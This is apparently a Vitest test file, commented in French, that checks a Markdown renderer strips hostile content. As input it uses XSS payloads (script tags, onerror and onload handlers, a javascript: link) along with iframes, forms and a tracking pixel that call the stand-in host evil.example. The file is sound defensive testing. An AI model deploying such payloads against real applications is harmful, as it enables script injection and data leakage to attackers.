// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { renderMarkdown } from "$lib/markdown";

// Le texte d'un modèle ou d'une page web est affiché tel quel dans l'application : il ne doit jamais pouvoir lancer du code ni appeler un serveur.
describe("renderMarkdown : contenu hostile", () => {
  it("retire les balises et les attributs qui exécutent du code", () => {
    const html = renderMarkdown(
      [
        "<script>window.hacked = 1</script>",
        '<img src="x" onerror="window.hacked = 2">',
        '<a href="javascript:window.hacked=3">clic</a>',
        '<iframe src="https://evil.example"></iframe>',
        '<svg onload="window.hacked=4"></svg>',
        "<form action=\"https://evil.example\"><input></form>",
      ].join("\n\n"),
    );
    expect(html).not.toMatch(/<script|onerror|onload|javascript:|<iframe|<form/i);
  });

  it("retire les champs de formulaire, sauf les cases à cocher des listes de tâches", () => {
    const html = renderMarkdown(
      ['<form action="https://evil.example"><input name="q"><button formaction="https://evil.example">ok</button></form>', "", "- [x] fait", "- [ ] à faire"].join("\n"),
    );
    expect(html).not.toMatch(/<form|<button|action=|formaction|name="q"/i);
    expect(html.match(/type="checkbox"/g)?.length).toBe(2);
    expect(html.match(/disabled/g)?.length).toBe(2);
  });

  it("masque les images distantes (elles enverraient une requête avec leur adresse)", () => {
    const html = renderMarkdown("![espion](https://evil.example/pixel.png?secret=1)");
    expect(html).not.toContain("evil.example/pixel");
    expect(html).toContain("image externe masquée");
  });

  it("garde les images intégrées", () => {
    const html = renderMarkdown("![ok](data:image/png;base64,AAAA)");
    expect(html).toContain("data:image/png;base64,AAAA");
  });

  it("retire les styles qui vont chercher une ressource", () => {
    const html = renderMarkdown('<p style="background:url(https://evil.example/x.png)">texte</p>');
    expect(html).not.toContain("evil.example");
    expect(html).toContain("texte");
  });

  it("affiche le Markdown et les formules normalement", () => {
    const html = renderMarkdown("# Titre\n\n**gras** et $x^2$\n\n- a\n- b");
    expect(html).toContain("<h1");
    expect(html).toContain("<strong>gras</strong>");
    expect(html).toContain("katex");
    expect(html.match(/<li>/g)?.length).toBe(2);
  });
});
